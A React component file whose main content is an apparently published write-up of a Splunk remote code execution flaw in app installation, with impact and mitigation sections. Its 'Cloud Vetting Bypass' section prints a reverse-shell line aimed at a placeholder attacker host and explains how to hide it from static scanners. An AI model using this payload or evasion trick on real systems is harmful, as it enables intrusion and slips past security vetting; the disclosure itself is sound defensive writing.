import React from 'react';
import styled, { keyframes } from 'styled-components';

const fadeIn = keyframes`
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
`;

const glowPulse = keyframes`
  0% { box-shadow: 0 0 5px rgba(114, 159, 207, 0.5); }
  50% { box-shadow: 0 0 20px rgba(114, 159, 207, 0.8); }
  100% { box-shadow: 0 0 5px rgba(114, 159, 207, 0.5); }
`;

const slideIn = keyframes`
  from { opacity: 0; transform: translateX(-20px); }
  to { opacity: 1; transform: translateX(0); }
`;

const Container = styled.div`
  padding: 2rem;
  max-width: 960px;
  margin: 0 auto;
  animation: ${fadeIn} 0.6s ease-out;
`;

const Header = styled.div`
  text-align: center;
  margin-bottom: 3rem;
  position: relative;

  &::after {
    content: '';
    position: absolute;
    bottom: -1rem;
    left: 50%;
    transform: translateX(-50%);
    width: 80px;
    height: 2px;
    background: var(--kali-blue);
    animation: ${glowPulse} 2s infinite;
  }
`;

const Title = styled.h1`
  font-size: 2.7rem;
  color: #729FCF;
  text-shadow: 0 0 12px rgba(114, 159, 207, 0.5);
`;

const Meta = styled.div`
  display: flex;
  justify-content: center;
  gap: 2rem;
  font-size: 0.85rem;
  color: #ccc;
`;

const Content = styled.div`
  color: #ddd;
  line-height: 1.75;
`;

const Section = styled.section`
  background: #121212;
  padding: 1.75rem;
  border-left: 4px solid var(--kali-blue);
  border-radius: 10px;
  margin-bottom: 2rem;
  transition: box-shadow 0.3s;
  position: relative;

  &:hover {
    box-shadow: 0 0 15px rgba(114, 159, 207, 0.5);
  }
`;

const SectionTitle = styled.h2`
  font-size: 1.9rem;
  color: #729FCF;
  margin-bottom: 1rem;
  position: relative;

  &::after {
    content: '';
    position: absolute;
    left: 0;
    bottom: -6px;
    height: 2px;
    width: 100%;
    background: var(--kali-blue);
    transform: scaleX(0);
    transform-origin: left;
    transition: transform 0.3s ease;
  }

  ${Section}:hover &::after {
    transform: scaleX(1);
  }
`;

const Paragraph = styled.p`
  margin-bottom: 1rem;
  opacity: 0.95;
`;

const CodeBlock = styled.pre`
  background: #000;
  border: 1px solid #729FCF;
  border-radius: 6px;
  padding: 1rem;
  overflow-x: auto;
  color: #fff;
  font-family: 'Share Tech Mono', monospace;
  position: relative;

  &::before {
    content: '>';
    position: absolute;
    top: 0.5rem;
    left: 0.5rem;
    color: var(--kali-blue);
  }
`;

const Warning = styled.div`
  background: rgba(255, 0, 0, 0.1);
  border: 1px solid #FF0000;
  color: #FF4C4C;
  padding: 1rem;
  border-radius: 6px;
  margin: 1.5rem 0;
  font-weight: bold;

  &::before {
    content: '⚠️';
    margin-right: 0.5rem;
  }
`;

const List = styled.ul`
  list-style: none;
  padding-left: 0;
  margin: 1rem 0;

  li {
    position: relative;
    padding-left: 1.5rem;
    margin-bottom: 0.8rem;

    &::before {
      content: '→';
      position: absolute;
      left: 0;
      color: var(--kali-blue);
    }
  }
`;

const OrderedList = styled.ol`
  list-style: none;
  padding-left: 0;
  counter-reset: item;

  li {
    position: relative;
    padding-left: 1.5rem;
    margin-bottom: 0.8rem;
    counter-increment: item;
    animation: ${slideIn} 0.5s ease-out;

    &::before {
      content: counter(item) '.';
      position: absolute;
      left: 0;
      color: var(--kali-blue);
    }
  }
`;

const SplunkRCEArticle = () => {
  return (
    <Container>
      <Header>
        <Title>Technical Dissection of a Splunk Remote Code Execution Vulnerability</Title>
        <Meta>
          <span>Published: January 15, 2024</span>
          <span>Reading Time: 15 minutes</span>
        </Meta>
      </Header>
      <Content>
        <Section>
          <SectionTitle>Executive Summary</SectionTitle>
          <Paragraph>
            This article presents a technical analysis of a Remote Code Execution (RCE) vulnerability affecting Splunk’s app installation mechanism. Through the exploitation of its app validation logic, I was able to inject and execute arbitrary Python code, ultimately leading to full system compromise during the installation phase.
          </Paragraph>
        </Section>

        <Section>
          <SectionTitle>Vulnerability Discovery</SectionTitle>
          <Paragraph>
            The vulnerability lies within the execution flow of the `setup.py` script included in Splunk applications. When an app is installed manually (via CLI or UI), Splunk does not adequately sanitize or validate the contents of this script before execution.
          </Paragraph>
          <CodeBlock>
            <code>{`# Manual install path (unsafe)
splunk install app /tmp/malicious_app.tgz
# setup.py is executed with full privileges
# Arbitrary Python code can be injected here`}</code>
          </CodeBlock>
        </Section>

        <Section>
          <SectionTitle>Proof of Concept</SectionTitle>
          <Paragraph>
            The proof of concept consists of a custom application package embedding a `setup.py` script with malicious payloads. The structure is straightforward:
          </Paragraph>
          <CodeBlock>
            <code>{`malicious_app/
├── default/
│   └── app.conf
├── bin/
│   └── setup.py  # Injected payload
└── README.txt`}</code>
          </CodeBlock>
          <Warning>
            <p>This PoC is for educational and responsible disclosure purposes only. Never test this in production environments.</p>
          </Warning>
        </Section>

        <Section>
          <SectionTitle>Cloud Vetting Bypass</SectionTitle>
          <Paragraph>
            Modern platforms often employ static analysis tools during cloud vetting processes to detect potential threats such as embedded reverse shell commands. These tools commonly flag strings like `os.system("bash -i")` or similar inline calls. However, using Python’s `subprocess.run()` with arguments passed as lists, it's possible to obfuscate the intent and evade static detection:
          </Paragraph>
          <CodeBlock>
            <code>{`import subprocess
subprocess.run(["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"], check=True)`}</code>
          </CodeBlock>
          <Paragraph>
            Because the command is passed as an array, and `bash -c` is invoked dynamically, many scanners fail to recognize the payload as malicious, allowing the package to pass automated security checks.
          </Paragraph>
        </Section>

        <Section>
          <SectionTitle>Impact Analysis</SectionTitle>
          <Paragraph>
            If exploited, this vulnerability permits an attacker to:
          </Paragraph>
          <List>
            <li>Gain full remote shell access on the host running Splunk</li>
            <li>Exfiltrate logs and sensitive telemetry data</li>
            <li>Pivot to other internal infrastructure connected to Splunk</li>
            <li>Maintain persistence via malicious apps or forwarders</li>
          </List>
        </Section>

        <Section>
          <SectionTitle>Mitigation Recommendations</SectionTitle>
          <Paragraph>
            Security teams are advised to take the following actions:
          </Paragraph>
          <OrderedList>
            <li>Upgrade to the latest version of Splunk with hardened installation logic</li>
            <li>Restrict installation of third-party apps to trusted and reviewed sources</li>
            <li>Manually inspect app packages prior to deployment</li>
            <li>Deploy runtime monitoring to detect suspicious subprocess invocations</li>
            <li>Implement app sandboxing where feasible</li>
          </OrderedList>
        </Section>

        <Section>
          <SectionTitle>Final Considerations</SectionTitle>
          <Paragraph>
            The incident underscores the criticality of both static and dynamic analysis in CI/CD pipelines for app vetting. Developers and platform maintainers must remain vigilant and integrate multiple layers of protection when handling third-party packages.
          </Paragraph>
          <Warning>
            <p>Never trust app content blindly—inspect, test, and monitor continuously.</p>
          </Warning>
        </Section>
      </Content>
    </Container>
  );
};

export default SplunkRCEArticle;